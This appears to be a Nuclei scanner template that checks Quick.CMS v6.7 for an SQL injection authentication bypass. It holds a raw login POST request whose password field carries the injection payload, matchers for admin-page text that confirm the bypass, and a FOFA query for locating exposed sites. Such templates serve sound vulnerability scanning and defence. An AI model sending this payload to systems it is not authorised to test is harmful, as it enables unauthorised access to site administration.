http:
- host-redirects: true
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - Log out</a>
    - Settings</a>
    - Plugins</a>
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  raw:
  - 'POST /admin.php?p=login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    sEmail=test%40test.net&sPass=%27+or+1%5D%2500&bAcceptLicense=1&iAcceptLicense=true

    '
id: quick-cms-sqli
info:
  author: Kazgangap
  description: 'Quick.CMS version 6.7 suffers from a remote SQL injection vulnerability
    that allows for authentication bypass.

    '
  metadata:
    fofa-query: body="Quick.Cms v6.7"
    max-request: 1
    verified: true
  name: Quick.CMS v6.7 - SQL Injection
  reference:
  - https://packetstormsecurity.com/files/177657/Quick.CMS-6.7-SQL-Injection.html
  - https://www.exploit-db.com/exploits/51910
  severity: high
  tags: packetstorm,quickcms,sqli,cms
